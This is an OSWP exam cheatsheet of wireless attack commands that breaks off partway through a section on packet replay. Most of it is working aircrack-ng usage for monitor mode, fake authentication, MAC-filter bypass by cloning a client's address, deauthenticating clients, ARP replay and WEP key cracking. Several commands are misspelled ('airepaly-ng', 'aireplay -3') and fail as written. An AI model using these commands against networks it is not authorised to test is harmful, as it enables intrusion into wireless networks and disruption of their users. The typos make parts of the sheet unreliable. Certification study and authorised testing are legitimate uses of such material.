OSWP commands cheatsheet:
	-	Alfa AWUS036H issue:
		-	Check for the issue:
			#dmesg |tail -5

			if the output is the below:
				Registered led device: rtl8187-phy0::radio 
				Registered led device: rtl8187-phy0::tx 
				Registered led device: 
				rtl8187-phy0::rx rtl8187: wireless switch is on
				rtl8187: wireless radio switch turned off

		-	Solution
				#touch alfa.sh
				#nano alfa.sh
					#!/bin/sh
					rmmod rtl8187
					rfkill block all
					rfkill unblock all
					modprobe rtl8187
					rfkill unblock all
					ifconfig wlan0 up
				#chmod +x alfa.sh
				#./alfa.sh

	-	Drivers Loading Issue:
		-	Check if the mac20811 is loaded:
			#iw list

			if failed, so ieee80211 is loaded
		-	Solution:
			#rmmod r8187
			#modprobe rtl8187
			#iwconfig
			#iw list

	-	IEEE80211 Monitor Mode:
		-	Put the interface in Monitor mode
			#iwconfig wlan0 mode monitor

		-	Get list of all access points within the range of the wireless card with its channel
			#iw dev <Mon_Interface> scan | egrep "ESSID|Channel"

	-	Mac80211 Monitoring Mode:
		-	Get allowed Frequencies
				#iwlist wlan0 frequency

		-	Create VAP
				#iw dev wlan0 interface add mon0 type monitor
				#ifconfig mon0 up

		-	Remove VAP
				#iw dev mon0 interface del

		-	Get all supported frequencies with the channels
				#iwlist <Mon_Interface> frequency

		-	Get list of all access points within the range of the wireless card
				#iw dev interface <Mon_Interface> scan | grep SSID

		-	Get list of all access points within the range of the wireless card with its channel
				#iw dev <Mon_Interface> scan | egrep "DS\ Parameter\ Set|SSID"

	-	Airmon-ng
		-	Show all wireless interfaces with its details
				#airmon-ng
		-	Create new monitor mode interface
				#airmon-ng start wlan0

		-	Create monitor mode on specific channel
				#airmon-ng start wlan0 3

		-	Check the current monitor mode channel
				#iwlist mon0 channel

		-	Delete existing monitor mode interface
				#airmon-ng stop mon0
	-	Airodump-ng
		-	General Sniffing
				#airodump-ng mon0

		-	Sniffing specific AP traffic
				#airodump-ng --channel <AP_Channel> --bssid <AP_MAC> -w <Capture_File-name> <Mon_Interface>

		-	Capturing IVs for WEP network
				#airodump-ng --channel <AP_Channel> --bssid <AP_MAC> -w <Capture_file-name> --ivs <Mon_Interface>

	-	Aireplay-ng
		-	General usage
				#aireplay-ng <options> <Interface_name>
		-	Injection Test
				#aireplay-ng -9 <Mon_Interface>

		-	Injection Test for Targeted ESSID --> monitor interface has to be in the same channel of the target ESSID
				#aireplay-ng -9 -e <ESSID> -a <AP_MAC> -i <Mon_Interface>

		-	Card-to-Card Injection test
				#aireplay-ng -9 -i <wlan1> <mon0>

				mon0 --> Trnsmitter
				wlan1 --> Receiver

	-	Crack WEP with Connected Clients
		-	Initials Attack Setup
			-	Airmon-ng
					#airmon-ng start <interface_name>
					#airodump-ng <Mon_interface>
						--> Get the channel of the target ESSID
					#airmon-ng stop <Mon_interface>
					#airmon-ng start <interface_name> <channel_num>

			-	Airodump-ng
					#airodump-ng -c <channel> --bssid <AP_MAC> -w <filename> <Mon_interface>

		-	Fake Authentication Attack					
			-	Aireplay-ng
				It there is no connected clients 
					#aireplay-ng -1 0 -e <ESSID> -a <AP_MAC> -h <Your_MAc> <Mon_interface>

				-	Bypass Open Networks with MAC filtering enabled
					1.	Place the card on Monitor mode on the targeted channel
							#airmon-ng start <interface_name>
							#airodump-ng <Mon_interface>
							--> Get the channel of the target ESSID
							#airmon-ng stop <Mon_interface>
							#airmon-ng start <interface_name> <channel_num>

					2.	Obtain a valid associated MAC address
							#airodump-ng --bssid <AP_MAC> --essid <Targeted_ESSID> --channel <Targeted_Channel> <Mon_interface>
						get the associated MAC addresses and wait some of them to leave the network.
							#CRTL-C

					3.	Change the MAC address of the wireless card with the valid obtained and leaved MAC address
							#ifconfig <Mon_interface> down
							#macchanger -m <Obtained_MAC-address> <Mon_interface>
							#ifconfig <mon_interface> up

					4.	Fake authrication using the obtained and leaved MAC address
						Run Airodump-ng to verify the attack result
							#airodump-ng --bssid <AP_MAC> --essid <Targeted_ESSID> --channel <Targeted_Channel> <Mon_interface>

						Run the Attack
							#airepaly-ng -1 0 -e <Targeted_ESSID> -a <AP_MAC> -h <Obtained_MAC-address> <Mon_interface>
							after successfully authenticated and verified from the Airodump-ng output
							CRTL-C

						Reset the Interface MAC address
							#macchanger -p wlan0mon
		-	Deauthentication Attack
			-	Aireplay-ng
				Send disassociatation packet for one or moare wireless clients currently connected to the targeted AP
					#aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <Mon_interface>

		-	ARP Replay Attack
			-	General usage
					#aireplay -3 -b <AP_Mac> -h <Source_MAC> <Mon_interface>
						<Source_MAC> can be either MAC address of already authenticated client or the self MAC address while doing Fake Authentication

				-	Steps
					1.	Place the card on Monitor mode on the targeted channel
							#airmon-ng start <interface_name>
							#airodump-ng <Mon_interface>
							--> Get the channel of the target ESSID
							#airmon-ng stop <Mon_interface>
							#airmon-ng start <interface_name> <channel_num>

					2.	Run Airodump-ng to capture the weak IVs and Fake Authentication->(if only WEP):
							Run Airodump-ng to verify the attack result
							#airodump-ng --bssid <AP_MAC> --essid <Targeted_ESSID> --channel <Targeted_Channel> -w <Capture_file><Mon_interface> 

							Run the fake authentication
							#airepaly-ng -1 0 -e <Targeted_ESSID> -a <AP_MAC> -h <Mon_interface_MAC-address> <Mon_interface>
							
					3.	Run ARP Request Replay Attack:
							#aireplay-ng -3 -b <AP_MAC> -h <Mon_interface_MAC-address> <Mon_interface>

					4.	Run Deauthentication against any authenticated clients to generate ARP:
							#aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <Mon_interface>

					5.	Run Aircrack-ng 
							#aircrack-ng -z <Capture_file>.cap
	-	Crack WEP via client
		-	Natural Packet Replay Attack
			-	General Usage
					#aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -t 1 <interface>
					for getting packet Broadcast (FF:FF:FF:FF:FF:FF) ARP Packet from wireless network to wired network with ToDS bit set to 1
					type Y to use this packet in the attack

		-	Modified Packet Replay 
			-	General Usage
					#aireplay-ng -2

















